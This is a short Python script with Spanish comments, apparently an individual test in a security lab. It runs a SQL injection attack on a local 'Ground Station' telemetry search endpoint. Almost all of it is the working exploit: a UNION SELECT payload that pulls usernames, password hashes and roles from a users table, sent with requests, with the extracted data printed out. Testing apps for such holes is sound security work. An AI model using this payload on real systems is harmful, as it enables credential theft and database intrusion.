#!/usr/bin/env python3
"""
Prueba Individual - Ataque 2: Inyección SQL (SQLi)
Prueba la extracción de credenciales mediante UNION SELECT en la búsqueda de telemetría.
"""
import requests

BASE_URL = "http://localhost:5000"

def test_attack_2():
    print("[+] Ejecutando Prueba Individual: Ataque 2 - Inyección SQL (SQLi)...")
    sqli_payload = "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,username,password_hash,role FROM users--"
    url = f"{BASE_URL}/api/telemetry"
    try:
        response = requests.get(url, params={"search": sqli_payload}, timeout=5)
        print(f"[*] GET {url}?search=... - Status Code: {response.status_code}")
        if response.status_code == 200:
            data = response.json()
            print("[✓] Vulnerabilidad SQLi confirmada! Datos extraídos de la BD:")
            print(data)
        else:
            print(f"[!] Respuesta inesperada: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_2()
